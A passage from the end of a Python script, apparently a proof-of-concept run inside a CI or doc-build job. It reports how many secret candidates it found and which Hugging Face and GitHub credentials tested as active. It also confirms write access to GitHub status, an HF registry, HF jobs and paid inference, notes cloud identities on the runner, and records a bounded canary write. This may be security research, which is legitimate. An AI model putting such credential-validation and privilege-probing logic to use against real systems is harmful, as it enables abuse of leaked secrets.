        emit(f"CONTENT_GIT_{key.upper()}", value)
    for key, value in sorted(remote_totals.items()):
        emit(f"CONTENT_REMOTE_{key.upper()}", value)
    emit("CONTENT_REMOTE_SCAN_BUDGET_REMAINING", remaining_budget[0])

    for key, value in sorted(state.counts.items()):
        emit(f"CONTENT_SCAN_{key.upper()}", value)
    validation = validate_discovered_candidates(state)
    for key, value in sorted(validation.items()):
        emit(f"CONTENT_VALIDATION_{key.upper()}", value)

    high_total = sum(
        value for key, value in state.counts.items() if key.startswith("high_") and key != "high_candidate_payloads"
    )
    active_secondary = (
        validation["hf_candidates_active"]
        + validation["github_candidates_active"]
    )
    emit("HIGH_CONFIDENCE_SECRET_CANDIDATE_COUNT", high_total)
    emit("ACTIVE_SECONDARY_CREDENTIAL_COUNT", active_secondary)
    emit("GITHUB_STATUS_WRITE_CONFIRMED", bool(github_results["status_write_succeeded"]))
    emit("HF_REGISTRY_PUSH_CONFIRMED", bool(registry_results["registry_push_claims"]))
    emit("HF_JOB_WRITE_CONFIRMED", bool(auth_results["jobs_write_auth_success"]))
    emit("HF_INFERENCE_INCUR_COST_CONFIRMED", bool(auth_results["inference_endpoint_infer_auth_success"]))
    emit("CLOUD_IDENTITY_CONFIRMED", bool(
        runner_results["aws_iam_role_present"]
        or runner_results["gcp_service_account_present"]
        or runner_results["azure_managed_identity_http_status"] == 200
    ))
    emit("MODEL_OR_HF_RESOURCE_WRITE_PERFORMED", False)
    emit("ONLY_BOUNDED_CANARY_STATUS_MUTATED", bool(github_results["status_write_succeeded"]))
    emit("COMPLETE", True)
    emit("INTENTIONAL_STOP_BEFORE_DOC_BUILD", True)
    return 78


if __name__ == "__main__":
    raise SystemExit(main())
